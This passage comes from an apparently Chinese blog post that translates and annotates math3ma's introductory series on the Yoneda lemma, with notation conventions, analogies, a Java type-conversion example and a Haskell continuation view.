&lt;li&gt;我们说“在X意义下等价”(up to X)有如下几种等价表述：&lt;ul&gt;
&lt;li&gt;对象间如果只相差一个X关系就可以转换为对方，那么我们认为他们是相同的&lt;/li&gt;
&lt;li&gt;对象间最多相差一个X的关系&lt;/li&gt;
&lt;li&gt;不考虑X带来的差异时相同&lt;/li&gt;
&lt;li&gt;（如果X是一种等价关系）按照X关系划分不同等价类，如果对象在一个等价类里则视为相同&lt;br&gt;例如：“在同构意义下等价”指的是在这种视角下，如果两个不同的对象至多只是相差一个同构关系，那么我们认为他们就是一个对象；”up to permutations”可理解为“不考虑置换带来的差异时相同”；5, 8, 11在模3的意义下等价。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;$ \mathbf{Set}^{ \mathbf{C} } $ 表示一个函子范畴，其中的函子是 $ \mathbf{C} \rightarrow { \mathbf{Set} } $. 为了方便书写（$\mathbf{C}$ 所指代的范畴没有什么歧义时），本文有时会如此简写：&lt;br&gt;$$ \mathbf{Set} :&amp;#x3D; \mathbf{Set}^{ \mathbf{C} }&lt;br&gt;$$ $$ \mathbf{Set}^{op} :&amp;#x3D; \mathbf{Set}^{ \mathbf{C}^{op} } $$ 这一记号有时在其他文章中记作 $\mathbf{Funct}(\mathbf{C},\mathbf{Set})$&lt;/li&gt;
&lt;li&gt;对于范畴C中的态射我们记作 $ \text{hom}_\mathbf{C}(X, Y) $，类似地，对 $\mathbf{C}$ 没有歧义时简写为$ \text{hom}(X, Y) $&lt;ul&gt;
&lt;li&gt;形如 $ \text{hom}(A, -): \mathbf{Set}^{ \mathbf{C} }$ 的记号代表一个函子，它将A发送到“所有从A出发的态射构成的集合”；这一记号有时在其他文章中记作 $h_A$&lt;/li&gt;
&lt;li&gt;形如 $ \text{hom}(-, A): \mathbf{Set}^{ \mathbf{C}^{op} } $ 的记号代表一个函子，它将A发送到“所有以A为目标的态射构成的集合”，这一记号有时在其他文章中记作 $h^A$&lt;/li&gt;
&lt;li&gt;形如 $ \text{hom}(-, -):  \mathbf{C} \rightarrow \mathbf{Set}^{ \mathbf{C}^{op} } 或 \mathbf{C}^{op} \rightarrow \mathbf{Set}^{ \mathbf{C} } $ 的记号将C对应到一个自然变换范畴，对于每个Y(或X)有$ h^Y(X)&amp;#x3D;h_X(Y)&amp;#x3D;\text{hom}(X, Y) $是新范畴中的对象，所有Y(或X)的取值对应的新对象构成新范畴的全部元素，这一记号有时在其他文章中记作 $h^{(-)}$ 或 $h$ 。根据本文对Yoneda嵌入的定义，本文中按 $ \mathbf{C} \rightarrow \mathbf{Set}^{ \mathbf{C}^{op} }$阐释。&lt;/li&gt;
&lt;li&gt;$h^{(-)}(f)_X$ 意为对于C中的态射 $f: A \rightarrow A’$，$h^{(-)}(f)$ 是一个自然变换，当其限制在每个分量(component) $ X $ 上时有 $ \text{hom}(X, A) \rightarrow \text{hom}(X, A’)$&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;许多文章会直接将 co-Yoneda引理 称作 Yoneda引理，co-Yoneda嵌入 称作 Yoneda嵌入 。为了避免歧义，本文规定如下（但本质上没有区别，不需要过于担心带来会混乱）：&lt;ul&gt;
&lt;li&gt;Yoneda嵌入： $\mathscr{Y}: \mathbf{C} \rightarrow \mathbf{Set}^{ \mathbf{C}^{op} }$&lt;/li&gt;
&lt;li&gt;Yoneda引理： $\mathbf{Nat}(\text{hom}(−,X),F)\cong F(X).$&lt;/li&gt;
&lt;li&gt;co-Yoneda嵌入： $\mathscr{co-Y}: \mathbf{C}^{op} \rightarrow \mathbf{Set}^{ \mathbf{C} }$&lt;/li&gt;
&lt;li&gt;co-Yoneda引理： $\mathbf{Nat}(\text{hom}(X,-),F)\cong F(X).$&lt;br&gt;译者推荐尽量使用英文的术语（例如，使用”presheaf”而非“预层”这一称呼）以减少歧义。如果读者愿意，也可以使用平假名$よ$来命名Yoneda嵌入（可能比较有趣吧）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这里有几条锦囊也许能帮你快速抓住核心，如有错漏欢迎斧正！如果在重新阅读时有晕头转向之感（尤其是第三部分），不妨试着阅读一番（&lt;strong&gt;如果是初次阅读不妨跳过，可以看完文章再回头看&lt;/strong&gt;）：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;笔者认为，对于Yoneda引理（更准确的说，是推论 1）最精炼的总结是：“人是一切社会关系的总和。”&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;blockquote&gt;
&lt;p&gt;你在一个粒子加速器工作。你想要理解某个粒子，你所能做的就是将其他粒子甩到它上面，看看会发生什么。如果你了解你的神秘粒子对所有可能的测试粒子种类以及所有可能的测试能量大小是如何做出响应的，那么你就已经知道关于你的神秘粒子的一切了。&lt;br&gt;You work at a particle accelerator. You want to understand some particle. All you can do is throw other particles at it and see what happens. If you understand how your mystery particle responds to all possible test particles at all possible test energies, then you know everything there is to know about your mystery particle.&lt;br&gt;&lt;em&gt;Source: &lt;a href=&#34;https://mathoverflow.net/a/3223&#34;&gt;https://mathoverflow.net/a/3223&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;熟悉群论的读者可能会想到凯莱定理(Cayley’s theorem)，也即所有群 G 同构于在 G 上的对称群(即 Sym(G))的子群。事实上，可以认为这个定理是米田引理的一个特例。文末会提到如何构造一个只有单个对象、态射对应群元素的范畴并在其上应用Yoneda引理以证明之。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在群作用语言下的等效表述：如果群作用子 $\sigma_g: G\rightarrow \text{Aut}_{\text{set} }(S)$ (也就是每个元素对应到一个自同构上)是单射的（也就是单同态），群作用 $G\times S\rightarrow S$在某个集合 S（S 可以来自 G 本身）上是忠实的&lt;/li&gt;
&lt;li&gt;为什么&lt;strong&gt;这样的&lt;/strong&gt;群作用是忠实的(faithful)？只需要关注单位元在集合 S 中对应的元素 u：此时在不同的自同构下 u 一定被发送(send)到不同元素上。（参见&lt;a href=&#34;https://www.youtube.com/watch?v=sNX3txN9zc4&amp;&#34;&gt;Chapter 7: Group actions, symmetric group and Cayley’s theorem | Essence of Group Theory&lt;/a&gt;）&lt;/li&gt;
&lt;li&gt;接下来你会看到米田引理证明过程中也是通过关注恒等映射这样的“单位元”被发送至何处（这单位元其实如同一个“凝结核”，确定了其被发送至何方后将引发连锁反应，使得所有其他对象的去向被一一确定，后文会详细阐述），从而得出米田嵌入的忠实性。这不是巧合。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;译者这里给出一个例子帮助读者梳理第一推论想表达的：假设现有Int(I), Double(D), Float(F)三种类型，这个定理告诉我们Float类型的意义就是如下几句陈述的总和：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对于任何F-&amp;gt;I的函数，我们可以：&lt;ul&gt;
&lt;li&gt;将f: F-&amp;gt;I转化为f’: I-&amp;gt;I&lt;/li&gt;
&lt;li&gt;将f: F-&amp;gt;D转化为f’: I-&amp;gt;D&lt;/li&gt;
&lt;li&gt;将f: F-&amp;gt;F转化为f’: I-&amp;gt;F&lt;br&gt;以及&lt;/li&gt;
&lt;li&gt;将g: I-&amp;gt;I转化为g’: F-&amp;gt;I &lt;/li&gt;
&lt;li&gt;将g: I-&amp;gt;D转化为g’: F-&amp;gt;D&lt;/li&gt;
&lt;li&gt;将g: I-&amp;gt;F转化为g’: F-&amp;gt;F&lt;br&gt;六种转化的具体方式确定下来。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;对于任何F-&amp;gt;D的函数，我们可以…&lt;/li&gt;
&lt;li&gt;对于任何F-&amp;gt;F的函数，我们可以…&lt;br&gt;（如果你觉得怪怪的，那也许是因为协变与逆变的小问题）&lt;br&gt;例如，对于函数downcast: Double-&amp;gt;Float，我们能将取整函数floorF: Float-&amp;gt;Int转为取整函数floorD: Double-&amp;gt;Int.&lt;br&gt;所以对于如下两个代码片段，他们是等价的，可以互相转换：&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//A&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Double a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;Int&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; floorD(a)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//B&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Double a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;Float&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;b&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; downcast(a)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;Int&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; floorF(b)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//C&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Double a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;Int&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; floorF(downcast(a))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
B与C显然是等价的。&lt;br&gt;A转B是一种扩展，这种扩展的意义是：Float这种类型可以通过在Double和Int间定义这些函数的转换关系创造出来。&lt;br&gt;B转A是一种缩减，这种缩减的意义是：我们不需要Float类型的具体中间值，也能运算出结果！&lt;br&gt;所以Float这一类型，或者说任何特定类型的本质都是在定义“涉及该特定类型的转换关系”之间的一种特定变换关系（例如Float类型将指导如何复合floorF和downcast得到floorD）.&lt;br&gt;而这种“涉及该特定类型的转换关系”的特定变换关系，和“各种类型的转换关系”是同构的，而众所周知范畴论从不要求相等，只要求同构，&lt;br&gt;&lt;strong&gt;所以一种类型即代表了一种对应该类型的特定变换关系，这种对应该类型的特定变换关系即定义了该类型。&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;（这里是基于co-Yoneda的叙述，但反正本质上没有区别）一种&lt;a href=&#34;https://bartoszmilewski.com/2015/09/01/the-yoneda-lemma/trackback/&#34;&gt;来自Bartosz Milewski的理解&lt;/a&gt;：任何数据类型 T 都可以被一个函数 f 所取代。f 接受一个T的“处理器”handler（这个handler会把T转成目标类型） 并执行其余计算——即是续延（Continuation）。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Haskell表述： &lt;code&gt;forall x . (t -&amp;gt; x) -&amp;gt; F x ≅ F t&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;我们可以把函子看成一种广义的容器（参见：&lt;a href=&#34;https://bartoszmilewski.com/2014/01/14/functors-are-containers/trackback/&#34;&gt;Functors are Containers&lt;/a&gt;），所以左边就是把t转成x，然后变成F x这一步只是把x装起来变成可以装x类型的容器而已（我们并不关心这个F对x做了什么，我们关心的是“F对x的确做了些什么”这个事实本身——所以把F x当作一个容器好了，只需要把x放进去然后盖上盖子，不去理睬里面发生了什么）。假设容器一开始只能装x类型，但是如果对所有可能的类型x，“装入t类型为F t”这事都能通过handler: t-&amp;gt;x转化为“装入x类型为F x”，那么这个容器事实上就是可以装t类型的。&lt;/li&gt;
&lt;li&gt;译者的理解是，如果不把&lt;code&gt;F x&lt;/code&gt;看作容器，而是看成类型构造器，那么可以这么解释：基于t构造新类型的实质，就是需要从每个t类型值构造新的F t类型值（所以在这种视角下，没有具体的转换细节，我们只知道有一个新类型F t带来新的关系，这些新的关系从旧关系导出）。对任意可能的类型x，每个t类型值都对应一种自己的&lt;em&gt;转换方式&lt;/em&gt;，使得各个handler: t-&amp;gt;x（某种意义上是关系）分别转化为一个值v，v的类型是基于x构造的新类型F x。 &lt;strong&gt;或者说，每个类型x都可以要求一个能把t值转化为x值的handler，而后用构造器F构造新类型时，就可以从handler这些旧有关系导出新类型F t与其他新类型F x之间的新关系；因为这些handler把类型t的运算细节“包办”了。&lt;/strong&gt; 对于任意类型x，任意的handler都有这种&lt;em&gt;转换方式&lt;/em&gt;（共同构成每个x的自然变换）。因此，应用类型构造器F时，类型t的每个值都会指导形如(t-&amp;gt;…)的handler该如何转换为(F t-&amp;gt;F…)，而这些自然变换构成了t类型存在的全部意义。所有和t有关的运算都可以视为一种类型构造，因此类型t的意义只有在运算中才会得到显现，一个不参与运算（不构造新类型）的类型没有任何存在价值，这符合直觉。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;分别取定F和A，会发现Yoneda引理这个同构关系对于F、t都是自然同构（参见&lt;a href=&#34;https://www.bilibili.com/video/BV1AN4y1V7mH&#34;&gt;【范畴论】第5讲，Yoneda引理&lt;/a&gt;）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;每日更新！&lt;/p&gt;
&lt;h2 id=&#34;1-3：米田视角-The-Yoneda-Perspective&#34;&gt;&lt;a href=&#34;#1-3：米田视角-The-Yoneda-Perspective&#34; class=&#34;headerlink&#34; title=&#34;1&amp;#x2F;3：米田视角(The Yoneda Perspective)&#34;&gt;&lt;/a&gt;&lt;a name=&#34;1&#34;&gt;&lt;/a&gt;1&amp;#x2F;3：米田视角(The Yoneda Perspective)&lt;/h2&gt;&lt;p&gt;&lt;em&gt;本部分翻译自 &lt;a href=&#34;https://www.math3ma.com/blog/the-yoneda-perspective&#34;&gt;https://www.math3ma.com/blog/the-yoneda-perspective&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://blog.sigfpe.com/2006/11/yoneda-lemma.html?m=1&#34;&gt;Dan Piponi&lt;/a&gt; 说这是“数学中最难的 trivial 玩意”；&lt;a href=&#34;https://ncatlab.org/nlab/show/Yoneda+lemma&#34;&gt;nLab&lt;/a&gt; 对它的看法是“初等的，深刻的，核心的”；而 &lt;a href=&#34;http://www.math.jhu.edu/~eriehl/context.pdf&#34;&gt;Emily Riehl&lt;/a&gt; 则将其提名为“可以说是范畴论中最重要的结果”。然而，正如 &lt;a href=&#34;http://www.maths.ed.ac.uk/~tl/categories/yoneda.ps&#34;&gt;Tom Leinster&lt;/a&gt; 所指出的，“许多人觉得它非常令人困惑。”&lt;br&gt;他们谈论的是什么？&lt;br&gt;&lt;strong&gt;正是米田引理(Yoneda lemma)。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/yoneda/yoneda.jpg&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;“但……”你问道，“米田引理是啥？如果它还只是一个引理，那么……天哪……定理是什么？”&lt;/p&gt;
&lt;p&gt;在回答问题之前，我想通过“悠闲地漫步”(leisurely stroll)于其中的两个推论来诱导出这个结果。实际上，话说在前头，我没有在范畴学领域的任何部分“漫步”的资质（译者注：作者的自谦）。的确，有资格为我们展示 Yoneda 引理（译者注：后文我们均如此称呼，因为更常用）这颗闪闪发光的精切钻石的，按理说是范畴学家们，而我不是范畴学家（译者注：依然是作者的自谦）。不过，我就是喜欢跟你讲述一些我所喜欢的事物，而Yoneda引理正是我喜欢的。因此，我们还是于此处相遇了！&lt;/p&gt;
&lt;p&gt;现在我可以选择简单地告诉你推论在我眼里的样子，也可以选择简单地把引理甩给你。但正如 &lt;a href=&#34;http://www.math.csi.cuny.edu/~maher/&#34;&gt;Joseph Maher&lt;/a&gt; 曾经说过的那样：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;数学是喜剧的反面，是反笑话(anti-joke)*。我们先告诉你笑点，然后费力地向你解释为什么这个笑点是对的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;所以，首先我要告诉你们一个笑点——关于 Yoneda 引理两个推论的总结。&lt;a href=&#34;http://www.math3ma.com/mathema/2016/10/6/the-sierpinski-space-and-its-special-property&#34;&gt;我之前在这个博客上提到过它&lt;/a&gt;，但我在这个系列中的目标是将它锚定在一个更正规严谨的数学基础上——也就是在费力地解释为什么它是正确的笑点。它是这样一个概念：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;数学对象完全由它们与其他对象的关系所决定。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;让我们称其为&lt;em&gt;Yoneda视角&lt;/em&gt;。简而言之，它表明，如果你想理解对象（集合、群、拓扑空间等等），那么用&lt;a href=&#34;http://www.math.harvard.edu/~mazur/preprints/when_is_one.pdf&#34;&gt;Barry Mazur&lt;/a&gt;的话来说，你会想要理解“它们与同类的、所有其他对象之间的关系网”。我们已经在几篇帖子中探讨了该理念——&lt;a href=&#34;http://www.math3ma.com/mathema/2016/9/12/the-most-obvious-secret-in-mathematics&#34;&gt;The Most Obvious Secret in Mathematics&lt;/a&gt;和&lt;a href=&#34;http://www.math3ma.com/mathema/2016/10/6/the-sierpinski-space-and-its-special-property&#34;&gt;The Sierpinski Space and its Special Property&lt;/a&gt;——所以我就不在这详细展开了。（如果你还没看过，请务必去看一看！你可以认为这些帖子是本文的前传。）但是我想提一嘴，Yoneda 视角启发了一种观点，一些数学家——还有这个博客**也越来越多地采纳了这种观点，也即&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;数学对象的性质比它的定义更重要。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;为什么要采用这种观点？因为脱口而出背诵定义很容易：笛卡尔乘积是…，集合生成的自由群是…，商拓扑是…但定义并不总是能说明一切。积是天然带有&lt;em&gt;目标为它&lt;/em&gt;或&lt;em&gt;从它出发&lt;/em&gt;的映射的吗？如果一个自由群的生成集位于另一个群内，这两个群在某种程度上存在联系吗？商空间上的连续函数是什么样子的？这些问题都研究对象的属性——而正是属性定义了对象的特征。一旦我们拓宽视角，从对象所存在的范畴这一视角检视对象，答案就会水落石出。&lt;/p&gt;
&lt;p&gt;我想表达的含义是什么呢？&lt;/p&gt;
&lt;p&gt;假设你想探索对象 X 的性质。现在想象一下，把自己带入另一个对象 Y 的视角。然后问：“从 Y 的视点(vantage point)看起来，X 是什么样的？” 然后现在走到另一个对象 Z 旁，同样设身身处地问：“现在呢？从 Z 这里看，X 是什么样？”一直这么做下去，直到你站在范畴中每个对象的角度都剖析了 X 一遍。最后，你就会收集到大量关于 X 的信息。&lt;/p&gt;
&lt;p&gt;就像&lt;a href=&#34;https://www.youtube.com/watch?v=vwF7AHTQaoc&#34;&gt;这个片段&lt;/a&gt;。从一侧看，片段里的这座雕塑像一头大象；从另一个角度看，它又看起来像两只长颈鹿。但这两个角度都没有给出对雕塑完整的描述。为了真正理解这座雕塑，我们应该从所有可能的视点来观看它。范畴理论也有同样的观点：更多的视点提供了更多的信息。注意，划重点：Yoneda 引理说明&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;所有&lt;/strong&gt;的视点会给出&lt;strong&gt;所有&lt;/strong&gt;的信息。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这就是上文所述 Yoneda视角 的本质，也是思维清晰的数学家如此重视态射、交换图、普遍性质等的原因之一（不知道你注意到了吗？）。这些都是关于关系的！当然，这只是一种直觉。实际数学形式是什么样的？那两个推论是什么？我所说的“…物体完全被…决定”究竟是什么意思？什么是“两个物体之间的关系”？我们如何看待“范畴中&lt;em&gt;所有对象的视点&lt;/em&gt;”？Yoneda 引理&lt;em&gt;具体&lt;/em&gt;是如何捕捉到这一点的？&lt;/p&gt;
&lt;p&gt;这些是我们&lt;a href=&#34;#2&#34;&gt;下周&lt;/a&gt;要回答的问题。&lt;br&gt;顺带一提，想复习一下范畴论吗？可以从这几个地方开始：&lt;br&gt;&lt;a href=&#34;http://www.math3ma.com/mathema/2017/1/17/what-is-category-theory-anyway&#34;&gt;What is Category Theory, Anyway?&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;http://www.math3ma.com/mathema/2017/1/23/what-is-a-category&#34;&gt;What’s a Category?&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;http://www.math3ma.com/mathema/2017/1/31/what-is-a-functor-part-1&#34;&gt;What’s a Functor?&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;http://www.math3ma.com/mathema/2017/2/6/what-is-a-natural-transformation&#34;&gt;What’s a Natural Transformation?&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;*: 所以数学家是 cocomedian? (那&lt;a href=&#34;https://www.instagram.com/p/BLwhFLFgTbE/?taken-by=math3ma&#34;&gt;comathematician&lt;/a&gt;是什么?)（译者注：co-这一词根前缀在范畴论中被大量应用，用来表达“对偶的”“反方向的”等意味。哇，这岂不是可以说明 coconut 其实就是 nut？）&lt;br&gt;**: 参见 &lt;a href=&#34;http://www.math3ma.com/mathema/2017/1/17/what-is-category-theory-anyway&#34;&gt;Exhibit A&lt;/a&gt; 和 &lt;a href=&#34;http://www.math3ma.com/mathema/2016/9/12/the-most-obvious-secret-in-mathematics&#34;&gt;Exhibit B&lt;/a&gt; 和 &lt;a href=&#34;http://www.math3ma.com/mathema/2016/10/6/the-sierpinski-space-and-its-special-property&#34;&gt;Exhibit C&lt;/a&gt; 和 &lt;a href=&#34;https://twitter.com/math3ma/status/894700378792611840&#34;&gt;Exhibit D&lt;/a&gt; 和 &lt;a href=&#34;http://www.math3ma.com/mathema/2017/2/22/crumbs&#34;&gt;Exhibit E&lt;/a&gt;, 作为例证&lt;/p&gt;
&lt;h2 id=&#34;2-3：米田嵌入-The-Yoneda-Embedding&#34;&gt;&lt;a href=&#34;#2-3：米田嵌入-The-Yoneda-Embedding&#34; class=&#34;headerlink&#34; title=&#34;2&amp;#x2F;3：米田嵌入(The Yoneda Embedding)&#34;&gt;&lt;/a&gt;2&amp;#x2F;3：&lt;a name=&#34;2&#34;&gt;&lt;/a&gt;米田嵌入(The Yoneda Embedding)&lt;/h2&gt;&lt;p&gt;&lt;em&gt;本部分翻译自 &lt;a href=&#34;https://www.math3ma.com/blog/the-yoneda-embedding&#34;&gt;https://www.math3ma.com/blog/the-yoneda-embedding&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;#1&#34;&gt;上周&lt;/a&gt;我们开始探讨Yoneda引理。然而，我们并没有直接陈述Yoneda引理本身（因为缺乏动机），而是“悠闲地漫步”于其推论之一———Yoneda视角，也就是：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;一个对象完全由其与其他对象的“关系”确定，&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;也就是：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;从范畴中的每个对象的视角看，对象是什么“样子”。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;但这让我们不禁想问，“实际数学形式是什么样的？那两个推论是什么推论？”在这篇文章中，我们会尽量找出答案。首先，让我们将这三个抽象叙述背后的具体数学概念具体化：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;“…两个对象之间的&lt;em&gt;关系&lt;/em&gt;…”&lt;/li&gt;
&lt;li&gt;“…范畴中&lt;em&gt;每个对象的视点&lt;/em&gt;…”&lt;/li&gt;
&lt;li&gt;“…一个对象&lt;em&gt;完全&lt;/em&gt;由…&lt;em&gt;表征(characterized)&lt;/em&gt;…”&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们将逐一解密这些叙述方式。接下来，设 Set 表示集合范畴，C 为任意范畴。&lt;/p&gt;
&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;“两个对象之间的关系”是指一个态射(morphism)。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;假如在 C 中，两个对象 X 和 Y 它们之间存在一个态射，那么我们就说他们“存在关系”。例如，如果X是一个具有&lt;a href=&#34;http://www.math3ma.com/the-back-pocket/2016/8/26/comparing-topologies&#34;&gt;离散拓扑&lt;/a&gt;的拓扑空间，那么从 X 到 Y 就有很多关系——也就是有很多从 X 到 Y 的连续函数——对于任何空间Y。事实上，从一个离散空间出发的&lt;em&gt;所有&lt;/em&gt;映射都是连续的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/yoneda/discrete.jpg&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;而反观域范畴，其中的对象之间的关系就非常少了——因为在具有不同特征(characteristics)的域之间不存在域同态！&lt;/p&gt;
&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;“…范畴中&lt;em&gt;每个对象的视点&lt;/em&gt;…” 编码在一个函子(functor)中&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;要“从 C 中所有对象的视点”分析一个对象 X ，我们需要一种方法来跟踪 X 与 C 中所有对象的关系网。这个“关系网”指的就是所有&lt;em&gt;从Z到X&lt;/em&gt;和&lt;em&gt;从X到Z&lt;/em&gt;的态射集合，也就是这些集合：&lt;br&gt;$$\text{hom}(Z,X)\ 与\ \text{hom}(X,Z)\ \text{,对于范畴}\mathbf{C}\text{中的任意对象}Z\text{.}$$&lt;br&gt;注意到，我们希望C中的&lt;em&gt;每个&lt;/em&gt;Z都对应一个不同的集合。一个可行的办法是通过&lt;a href=&#34;https://www.math3ma.com/blog/what-is-a-functor-part-2&#34;&gt;反变函子(contravariant functor)&lt;/a&gt; $\text{hom}(-,X): \mathbf{C}^{op}\rightarrow \mathbf{Set}$，它将Z发送到集合$\text{hom}(Z,X)$，并将态射$f:Z\rightarrow W$发送到其&lt;a href=&#34;https://www.math3ma.com/blog/the-sierpinski-space-and-its-special-property&#34;&gt;拉回(pullback)&lt;/a&gt; $f^*$，$f^*$则定义为“与f前复合(precomposing)”这一操作（译者注：前复合、后复合的解释参见&lt;a href=&#34;https://math.stackexchange.com/questions/3889401/what-are-post-composition-and-pre-composition-in-category-theory&#34;&gt;What are post-composition and pre-composition in category theory?&lt;/a&gt;，同时请注意区分 $f^*$ 与 $f_*$ 这两个记号以免混淆前复合与后复合）。类似的，对于C中的所有Z，集合$\text{hom}(X,Z)$都在&lt;a href=&#34;https://www.math3ma.com/blog/what-is-a-functor-part-1&#34;&gt;协变函子(covariant functor)&lt;/a&gt; $\text{hom}(X,-):\mathbf{C}\rightarrow\mathbf{Set}$的像(image)中。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/yoneda/network.jpg&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;“一个对象‘完全由…确定’”意味着你知道它是在同构的意义下等价(up to isomorphism)的。&lt;/p&gt;
&lt;/blockquote&gt;
